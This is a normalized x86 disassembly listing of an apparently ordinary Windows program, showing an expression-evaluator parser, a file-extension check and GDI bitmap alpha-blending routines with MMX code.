cmp ecx 0x66
je r-xdata
movzx edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fadd [ esi + 0x4 ]
fstp [ esi + 0x4 ]
pop esi
add esp 0x104
retn 0x4
cmp ecx 0x66
je r-xdata
movzx eax [ eax + lookup_table_4387fc ]
jmp [ eax * 4 + jump_table_4387e8 ]
movzx edx [ esi + 0x4 ]
mov [ esp + 0x4 ] edx
mov [ esi ] 0x66
fild [ esp + 0x4 ]
fadd [ eax + 0x4 ]
fstp [ esi + 0x4 ]
pop esi
add esp 0x104
retn 0x4
cmp ecx 0x69
jne r-xdata
fild [ esi + 0x4 ]
mov [ esi ] 0x66
fadd [ eax + 0x4 ]
fstp [ esi + 0x4 ]
pop esi
add esp 0x104
retn 0x4
cmp ecx 0x69
jne r-xdata
fld [ eax + 0x4 ]
fadd [ esi + 0x4 ]
fstp [ esi + 0x4 ]
pop esi
add esp 0x104
retn 0x4
cmp ecx 0x69
jne r-xdata
call sub_40b120
test al al
lea ecx [ esi + 0x8 ]
je r-xdata
mov ecx [ ecx + 0x4 ]
push ecx
lea edx [ esp + 0xc ]
push r--data
push edx
call sub_4b675e
add esp 0xc
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_402010
pop esi
add esp 0x104
retn 0x4
fld [ ecx + 0x4 ]
sub esp 0x8
fstp [ esp ]
lea ecx [ esp + 0x10 ]
push r--data
push ecx
call sub_4b675e
add esp 0x10
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esi + 0x8 ]
call sub_402010
pop esi
add esp 0x104
retn 0x4
call sub_40c960
push eax
lea ecx [ esi + 0x8 ]
call sub_402010
mov [ esi ] cx
movzx ecx [ esi + 0x4 ]
add ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
pop esi
add esp 0x104
retn 0x4
mov ecx [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
add ecx eax
mov [ esi + 0x4 ] ecx
pop esi
add esp 0x104
retn 0x4
fild [ eax + 0x4 ]
fadd [ esi + 0x4 ]
fstp [ esi + 0x4 ]
pop esi
add esp 0x104
retn 0x4
push r--data
call sub_402010
pop esi
add esp 0x104
retn 0x4
push r--data
call sub_402010
pop esi
add esp 0x104
retn 0x4
sub_438810
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0168
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6c
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10028 ]
cmp eax 0x20
jne r-xdata
cmp eax 0x17
jne r-xdata
call sub_438510
mov eax [ esi + 0x10028 ]
xor ebx ebx
cmp eax 0x19
je r-xdata
mov edx [ esp + 0x84 ]
push edx
call sub_439180
call sub_438510
mov ecx [ esp + 0x84 ]
push ecx
mov ecx esi
call sub_438810
cmp [ esi + 0x10028 ] 0x18
jne r-xdata
mov ecx esi
call sub_438510
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] bl
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x74 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x78
retn 0x4
mov ecx esi
call sub_438510
pop esi
pop ebx
mov ecx [ esp + 0x6c ]
mov [ fs : 0x0 ] ecx
add esp 0x78
retn 0x4
push ebp
mov ecx esi
call sub_438510
lea ecx [ esp + 0x30 ]
call sub_40b120
test al al
mov ebp [ esp + 0x88 ]
je r-xdata
cmp [ esp + 0x4c ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
cmp [ esp + 0x20 ] 0x10
jb r-xdata
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
mov [ esp + 0xc ] 0x76
lea eax [ esp + 0xc ]
push eax
mov ecx esi
mov [ esp + 0x84 ] 0x1
call sub_438810
cmp [ esp + 0x2c ] 0x10
mov [ esp + 0x80 ] bl
jb r-xdata
push ebp
mov ecx esi
call sub_438810
jmp r-xdata
mov edx [ esp + 0x38 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
pop esi
pop ebx
mov ecx [ esp + 0x6c ]
mov [ fs : 0x0 ] ecx
add esp 0x78
retn 0x4
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
mov [ esp + 0x2c ] 0x76
lea ecx [ esp + 0x2c ]
push ecx
mov ecx esi
mov [ esp + 0x80 ] ebx
call sub_439180
cmp [ esi + 0x10028 ] 0x1a
je r-xdata
mov eax [ esp + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
cmp [ esi + 0x10028 ] 0x21
jne r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x50 ] 0x10
pop ebp
jb r-xdata
mov ecx esi
call sub_438510
lea ecx [ esp + 0x30 ]
call sub_40b120
test al al
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop esi
pop ebx
mov ecx [ esp + 0x6c ]
mov [ fs : 0x0 ] ecx
add esp 0x78
retn 0x4
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] ebx
mov [ esp + 0x60 ] bl
mov [ esp + 0x54 ] 0x76
lea edx [ esp + 0x54 ]
push edx
mov ecx esi
mov [ esp + 0x84 ] 0x2
call sub_438810
lea ecx [ esp + 0x54 ]
call sub_40ba70
push ebp
mov ecx esi
call sub_438810
jmp r-xdata
sub_438a50
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0188
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10028 ]
cmp eax 0xb
push edi
jne r-xdata
cmp eax 0xa
jne r-xdata
call sub_438510
mov edi [ esp + 0x60 ]
push edi
mov ecx esi
call sub_438a50
xor ebx ebx
test al al
jne r-xdata
cmp eax 0x19
jne r-xdata
mov ecx esi
call sub_438510
mov ecx [ esp + 0x60 ]
push ecx
mov ecx esi
call sub_438a50
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
mov [ esp + 0x2c ] 0x69
mov [ esp + 0x30 ] ebx
push edi
lea ecx [ esp + 0x30 ]
mov [ esp + 0x5c ] ebx
call sub_437cd0
mov cx [ esp + 0x2c ]
mov dl [ esp + 0x30 ]
mov eax [ esp + 0x30 ]
mov [ edi ] cx
mov [ edi + 0x4 ] dl
push 0xffffffff
mov ecx eax
mov [ edi + 0x4 ] eax
push ebx
lea edx [ esp + 0x3c ]
mov [ edi + 0x4 ] ecx
push edx
lea ecx [ edi + 0x8 ]
call sub_401dd0
cmp [ esp + 0x4c ] 0x10
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp eax 0x5
jne r-xdata
mov ecx esi
call sub_438510
mov edx [ esp + 0x60 ]
push edx
mov ecx esi
call sub_438810
cmp [ esi + 0x10028 ] 0x1a
je r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
mov eax [ esp + 0x38 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
cmp eax 0x3
jne r-xdata
mov ecx esi
call sub_44fb40
mov ecx [ esp + 0x60 ]
mov [ ecx ] 0x62
mov [ ecx + 0x4 ] al
mov ecx esi
call sub_438510
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
mov ecx esi
call sub_438510
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
push r--data
lea ecx [ esp + 0x30 ]
call sub_4024d0
lea ecx [ esp + 0x2c ]
call sub_4480e0
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
cmp [ esp + 0x28 ] 0x10
jb r-xdata
cmp eax 0x4
jne r-xdata
mov ecx esi
call sub_44fb20
mov ecx [ esp + 0x60 ]
mov [ ecx ] 0x69
mov [ ecx + 0x4 ] eax
mov ecx esi
call sub_438510
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
cmp eax 0x1e
jne r-xdata
mov ecx esi
call sub_44fb30
mov eax [ esp + 0x60 ]
mov ecx esi
fstp [ eax + 0x4 ]
mov [ eax ] 0x66
call sub_438510
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
cmp eax 0x20
jne r-xdata
mov ecx esi
call sub_44fb10
sub esp 0x1c
mov ecx esp
mov [ esp + 0x28 ] esp
push eax
call sub_4024d0
mov ecx [ esp + 0x7c ]
call sub_438540
mov ecx [ esp + 0x50 ]
pop edi
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x50
retn 0x4
mov eax [ esp + 0x60 ]
push eax
mov ecx esi
call sub_438810
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
retn 0x4
sub_438d10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0188
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push esi
mov esi [ esp + 0x38 ]
push edi
push esi
mov edi ecx
call sub_438a50
cmp [ esi ] 0x76
je r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x30
retn 0x4
push ebx
push ebp
mov ebp 0xf
xor ebx ebx
lea esp [ esp ]
mov ecx edi
call sub_438510
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x10 ] 0x76
lea eax [ esp + 0x10 ]
push eax
mov ecx edi
mov [ esp + 0x40 ] ebx
call sub_438a50
lea eax [ esi - 0xc ]
cmp eax 0x22
ja r-xdata
cmp esi 0xd
je r-xdata
cmp [ esp + 0x30 ] 0x10
mov [ esp + 0x3c ] 0xffffffff
jb r-xdata
movzx ecx [ eax + lookup_table_438e44 ]
jmp [ ecx * 4 + jump_table_438e30 ]
cmp esi ebp
je r-xdata
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x44 ]
lea edx [ esp + 0x10 ]
push edx
call sub_437dc0
jmp r-xdata
mov ecx [ esp + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call sub_437ec0
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x48 ]
call sub_4380b0
jmp r-xdata
mov ecx [ esp + 0x44 ]
lea edx [ esp + 0x10 ]
push edx
call sub_438000
cmp esi 0x2e
jne r-xdata
mov esi [ edi + 0x10028 ]
cmp esi 0xc
je r-xdata
pop ebp
pop ebx
sub_438e70
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0188
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebp
mov ebp [ esp + 0x38 ]
push edi
push ebp
mov edi ecx
call sub_438d10
cmp [ ebp ] 0x76
je r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x30
retn 0x4
push ebx
push esi
xor ebx ebx
mov ecx edi
call sub_438510
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x10 ] 0x76
lea eax [ esp + 0x10 ]
push eax
mov ecx edi
mov [ esp + 0x40 ] ebx
call sub_438d10
lea eax [ esi - 0xa ]
cmp eax 0x2f
ja r-xdata
cmp esi 0xb
je r-xdata
cmp [ esp + 0x30 ] 0x10
mov [ esp + 0x3c ] 0xffffffff
jb r-xdata
movzx ecx [ eax + lookup_table_438fe0 ]
jmp [ ecx * 4 + jump_table_438fc4 ]
cmp esi 0xe
je r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea edx [ esp + 0x10 ]
push edx
mov ecx ebp
call sub_4385a0
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
mov ecx ebp
call sub_437cd0
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebp
call sub_4381e0
jmp r-xdata
lea edx [ esp + 0x10 ]
push edx
mov ecx ebp
call sub_438240
jmp r-xdata
cmp [ ebp ] 0x69
jne r-xdata
cmp [ ebp ] 0x69
jne r-xdata
cmp esi 0x10
je r-xdata
mov esi [ edi + 0x10028 ]
cmp esi 0xa
je r-xdata
cmp [ esp + 0x10 ] 0x69
jne r-xdata
cmp [ esp + 0x10 ] 0x69
jne r-xdata
cmp esi 0x38
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ebp + 0x4 ]
sar eax cl
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ebp + 0x4 ]
shl eax cl
cmp esi 0x39
jne r-xdata
mov [ ebp + 0x4 ] eax
pop esi
pop ebx
sub_439010
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0188
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push esi
mov esi [ esp + 0x38 ]
push edi
push esi
mov edi ecx
call sub_438e70
cmp [ esi ] 0x76
je r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x30
retn 0x4
push ebp
mov ebp [ edi + 0x10028 ]
cmp ebp 0x30
jl r-xdata
pop ebp
cmp ebp 0x35
jg r-xdata
mov ecx edi
call sub_438510
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0xc ] 0x76
lea eax [ esp + 0xc ]
push eax
mov ecx edi
mov [ esp + 0x3c ] 0x0
call sub_438e70
lea eax [ ebp - 0x30 ]
cmp eax 0x5
ja r-xdata
cmp [ esp + 0x2c ] 0x10
jb r-xdata
jmp [ eax * 4 + jump_table_43915c ]
mov eax [ esp + 0x18 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_4382a0
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
mov ecx esi
call sub_4383d0
neg al
sbb al al
inc al
jmp r-xdata
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4383d0
jmp r-xdata
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_4382a0
neg al
sbb al al
inc al
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
mov ecx esi
call sub_4382a0
test al al
jne r-xdata
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_4382a0
test al al
jne r-xdata
mov [ esi ] 0x62
mov [ esi + 0x4 ] al
xor al al
jmp r-xdata
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4383d0
test al al
jne r-xdata
mov al 0x1
lea edx [ esp + 0xc ]
push edx
mov ecx esi
call sub_4383d0
test al al
jne r-xdata
sub_439180
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0188
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebp
mov ebp [ esp + 0x38 ]
push esi
push ebp
mov esi ecx
call sub_439010
cmp [ ebp ] 0x76
je r-xdata
mov ecx [ esp + 0x2c ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x30
retn 0x4
push edi
mov edi [ esi + 0x10028 ]
cmp edi 0x36
jl r-xdata
pop edi
cmp edi 0x37
jg r-xdata
push ebx
mov ecx esi
call sub_438510
xor ebx ebx
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x10 ] 0x76
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
mov [ esp + 0x40 ] ebx
call sub_439010
mov eax edi
sub eax 0x36
je r-xdata
mov ecx ebp
call sub_40b120
test al al
je r-xdata
dec eax
jne r-xdata
mov [ ebp ] 0x62
mov [ ebp + 0x4 ] bl
lea ecx [ esp + 0x10 ]
call sub_40b120
test al al
je r-xdata
cmp [ esp + 0x30 ] 0x10
pop ebx
jb r-xdata
mov ecx ebp
call sub_40b120
test al al
jne r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov bl 0x1
jmp r-xdata
sub_439280
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push ebp
mov [ esp + 0xc ] 0x7
call [ lstrlenA@IAT ]
mov ebx eax
mov eax [ rw-data ]
cmp eax 0x3
ja r-xdata
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
jmp [ eax * 4 + jump_table_4393fc ]
push ebp
call sub_4b3da0
add esp 0x4
test eax eax
je r-xdata
cmp ebx 0x4
push esi
push edi
jle r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov [ esp + 0x8 ] 0x5
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
cmp eax 0x1
jne r-xdata
mov esi [ lstrcmpiA@IAT ]
push r--data
lea edi [ ebx + ebp - 0x4 ]
push edi
call esi
test eax eax
je r-xdata
pop edi
pop esi
push ebp
call sub_4b3da0
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
mov [ esp + 0x8 ] 0x1
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
push r--data
push edi
call esi
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x5
cmp ebx 0x5
jle r-xdata
push r--data
push edi
call esi
test eax eax
jne r-xdata
push r--data
lea eax [ ebx + ebp - 0x5 ]
push eax
call esi
test eax eax
je r-xdata
push r--data
push edi
call esi
test eax eax
jne r-xdata
pop edi
pop esi
mov [ esp + 0x8 ] 0x2
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
push r--data
push edi
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov [ esp + 0x4 ] eax
pop ebx
pop ecx
retn
push r--data
push edi
call esi
test eax eax
je r-xdata
pop edi
pop esi
mov [ esp + 0x8 ] 0x4
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
pop edi
pop esi
mov [ esp + 0x8 ] 0x3
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
push r--data
push edi
call esi
test eax eax
je r-xdata
push r--data
push edi
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
pop edi
pop esi
mov [ esp + 0x8 ] 0x6
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
sub_439440
push esi
mov esi ecx
mov eax [ esi + 0x428 ]
push edi
xor edi edi
cmp eax edi
mov [ esi + 0x42c ] edi
je r-xdata
mov eax [ esi + 0x450 ]
cmp eax edi
je r-xdata
push eax
call j_sub_4b66ed
add esp 0x4
mov [ esi + 0x428 ] edi
mov eax [ esi + 0x44c ]
cmp eax edi
je r-xdata
push eax
call [ DeleteDC@IAT ]
mov [ esi + 0x450 ] edi
pop edi
pop esi
retn
push eax
call [ DeleteObject@IAT ]
mov [ esi + 0x44c ] edi
sub_4394a0
push ebp
lea ebp [ esp - 0x5c ]
sub esp 0xac
mov [ ebp + 0x48 ] ecx
cmp [ ecx + 0x440 ] 0x40000020
je r-xdata
mov edx [ ebp + 0x70 ]
push esi
push edi
xor eax eax
lea edx [ edx * 4 + 0xf ]
and edx 0xfffffff0
mov ecx 0xa
lea edi [ ebp - 0xc ]
[ edi ]
mov eax edx
mov [ ebp + 0x4c ] edx
cdq
push 0x0
push 0x0
and edx 0x3
add eax edx
lea ecx [ ebp + 0x58 ]
push ecx
sar eax 0x2
push 0x0
lea edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x74 ]
push edx
push 0x0
mov [ ebp - 0xc ] 0x28
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x4 ] 0x0
mov [ ebp ] 0x1
mov [ ebp + 0x2 ] 0x20
call [ CreateDIBSection@IAT ]
mov edi eax
test edi edi
mov [ ebp + 0x34 ] edi
jne r-xdata
or eax 0xffffffff
add ebp 0x5c
mov esp ebp
pop ebp
retn 0x1c
push 0x0
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
mov [ ebp + 0x30 ] esi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
add ebp 0x5c
mov esp ebp
pop ebp
retn 0x1c
push ebx
push edi
push esi
call [ SelectObject@IAT ]
mov ecx [ ebp + 0x6c ]
mov eax [ ebp + 0x68 ]
mov edx [ ebp + 0x70 ]
push ecx
push eax
push 0x0
add edx eax
push 0x0
mov [ ebp + 0x20 ] eax
mov [ ebp + 0x28 ] edx
mov edx [ ebp + 0x74 ]
push 0x0
lea eax [ ebp + 0x20 ]
push eax
add edx ecx
push esi
mov [ ebp + 0x24 ] ecx
mov [ ebp + 0x2c ] edx
call sub_45cef0
add esp 0x1c
call [ GdiFlush@IAT ]
mov esi [ ebp + 0x48 ]
mov ecx esi
call sub_435850
mov ebx [ ebp + 0x70 ]
mov ecx [ ebp + 0x74 ]
mov edx eax
mov eax [ esi + 0x8 ]
test eax eax
mov [ ebp + 0x40 ] edx
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x54 ] ecx
jge r-xdata
push edi
call [ DeleteObject@IAT ]
pop edi
mov eax 0xfffffffd
pop esi
add ebp 0x5c
mov esp ebp
pop ebp
retn 0x1c
sub eax [ esi + 0x448 ]
mov edi [ ebp + 0x7c ]
sub eax ecx
mov ecx [ esi + 0x444 ]
sub eax edi
imul eax edx
add ecx [ ebp + 0x78 ]
lea edi [ eax + ecx * 4 ]
add edi [ esi + 0x42c ]
mov eax [ esi + 0x448 ]
add eax [ ebp + 0x7c ]
mov edi [ ebp + 0x78 ]
imul eax edx
mov edx [ esi + 0x444 ]
add edx edi
lea edi [ eax + edx * 4 ]
mov eax [ esi + 0x42c ]
mov edx [ ebp + 0x58 ]
add edi eax
mov eax [ ebp + 0x4c ]
dec ecx
imul ecx eax
add edx ecx
neg eax
mov [ ebp + 0x58 ] edx
mov [ ebp + 0x4c ] eax
jmp r-xdata
mov eax [ ebp + 0x54 ]
test eax eax
jle r-xdata
mov eax [ ebp + 0x54 ]
dec ebx
dec eax
mov [ ebp + 0x54 ] eax
mov eax 0xff00ff
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x38 ] eax
mov [ ebp + 0x3c ] eax
mov esi [ ebp + 0x50 ]
mov edi [ ebp + 0x58 ]
mov ecx [ ebp + 0x54 ]
mov ebx [ ebp + 0x40 ]
mov edx [ ebp + 0x4c ]
pxor mm7 mm7
movq mm6 [ ebp + 0x38 ]
lea edx [ ebp - 0x50 ]
push edx
mov [ ebp + 0x50 ] edi
call sub_4a9c60
mov al [ ebp - 0x18 ]
add esp 0x4
test al 0x1
je r-xdata
mov edi [ ebp + 0x30 ]
mov ecx [ ebp + 0x74 ]
mov edx [ ebp + 0x70 ]
mov eax [ ebp + 0x6c ]
push 0xcc0020
push 0x0
push 0x0
push edi
push ecx
mov ecx [ ebp + 0x68 ]
push edx
mov edx [ ebp + 0x64 ]
push eax
push ecx
push edx
call [ BitBlt@IAT ]
push edi
mov esi eax
call [ DeleteDC@IAT ]
mov eax [ ebp + 0x34 ]
push eax
call [ DeleteObject@IAT ]
mov eax esi
dec eax
neg eax
pop ebx
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add ebp 0x5c
mov esp ebp
pop ebp
retn 0x1c
mov [ ebp + 0x54 ] eax
movd mmx0 [ esi + eax * 4 ]
movd mmx1 [ edi + eax * 4 ]
movq mm2 mmx0
psrlq mm2 0x18
punpcklbw mmx0 mm7
punpcklwd mm2 mm2
punpcklbw mmx1 mm7
punpckldq mm2 mm2
movq mm3 mm2
movq mm4 mm6
psubw mm4 mm3
pmullw mmx0 mm2
pmullw mmx1 mm4
paddw mmx0 mmx1
psrlw mmx0 0x8
packuswb mmx0 mm7
movd [ edi + eax * 4 ] mmx0
dec eax
jns r-xdata
add esi ebx
add edi edx
dec ecx
jns r-xdata
mov eax [ ebp + 0x4c ]
mov ecx [ ebp + 0x58 ]
mov edx [ ebp + 0x40 ]
add ecx eax
mov eax [ ebp + 0x54 ]
add edi edx
dec eax
mov [ ebp + 0x50 ] edi
mov [ ebp + 0x58 ] ecx
mov [ ebp + 0x54 ] eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x44 ]
emms
jmp r-xdata
xor esi esi
test ebx ebx
jle r-xdata
mov eax [ edi + esi * 4 ]
mov ecx [ ebp + 0x58 ]
mov ecx [ ecx + esi * 4 ]
mov ebx ecx
and ebx 0xff00
mov [ ebp + 0x3c ] ebx
mov edi ecx
and ecx 0xff
mov ebx eax
and ebx 0xff
sub ebx ecx
mov edx eax
shr edx 0x18
imul ebx edx
shr ebx 0x8
add ebx ecx
mov ecx eax
and ecx 0xff0000
and edi 0xff0000
sub ecx edi
imul ecx edx
shr ecx 0x8
add ecx edi
and ebx 0xff
and ecx 0xff0000
and eax 0xff00
or ebx ecx
mov ecx [ ebp + 0x3c ]
mov edi [ ebp + 0x50 ]
sub eax ecx
imul eax edx
mov edx [ ebp + 0x58 ]
shr eax 0x8
add eax ecx
and eax 0xff00
or ebx eax
mov [ edx + esi * 4 ] ebx
mov ebx [ ebp + 0x44 ]
inc esi
cmp esi ebx
jl r-xdata
sub_4397d0
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_439440
mov eax [ esi + 0x458 ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
lea edx [ esi + 0x460 ]
xor eax eax
mov ecx 0xc
mov edi edx
[ edi ]
mov edi [ esp + 0x1c ]
cmp edi 0x2000000c
mov [ edx ] ebp
mov [ esi + 0x464 ] ebx
jg r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0x20000008
jg r-xdata
cmp edi 0x20000010
je r-xdata
je r-xdata
cmp eax 0x20000010
je r-xdata
je r-xdata
mov [ esi + 0x474 ] 0x60000004
cmp edi 0x40000020
je r-xdata
mov [ esi + 0x474 ] 0xa0000008
jmp r-xdata
mov eax edi
sub eax 0x10000018
je r-xdata
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
mov edx ebp
and edx 0x1
add edx ebp
mov ecx ebx
and ecx 0x1
lea eax [ edx + edx + 0xf ]
and eax 0xfffffff0
add ecx ebx
neg ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ecx
cmp eax 0x40000020
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
lea ecx [ ebp + 0xf ]
and ecx 0xfffffff0
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ebx
jmp r-xdata
sub eax 0x10000018
je r-xdata
mov eax [ esi + 0x45c ]
test eax eax
je r-xdata
inc [ ecx ]
mov [ esi + 0x474 ] 0x50000002
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn 0x14
mov eax [ esi + 0x458 ]
mov ecx [ eax ]
push 0x10
push edx
lea edx [ esp + 0x1c ]
push edx
push eax
call [ ecx + 0x38 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov [ esi + 0x474 ] 0x50000001
jmp r-xdata
sub eax 0x8
je r-xdata
mov eax [ esi + 0x8 ]
cdq
xor eax edx
sub eax edx
imul eax edi
add eax 0xf
push eax
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ esi + 0x428 ] eax
je r-xdata
lea ecx [ esi + 0x29 ]
mov edi edi
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
lea eax [ ebp * 4 + 0xf ]
and eax 0xfffffff0
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ esi + 0xe ] 0x20
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov [ esi + 0xe ] 0x8
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
lea ecx [ ebp + ebp * 2 + 0x10 ]
and ecx 0xfffffff0
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
mov [ esi + 0xe ] 0x18
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
jmp r-xdata
sub eax 0x8
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov [ esi + 0x45c ] ecx
je r-xdata
cmp [ eax ] 0x1
jne r-xdata
sub eax 0xfffffe8
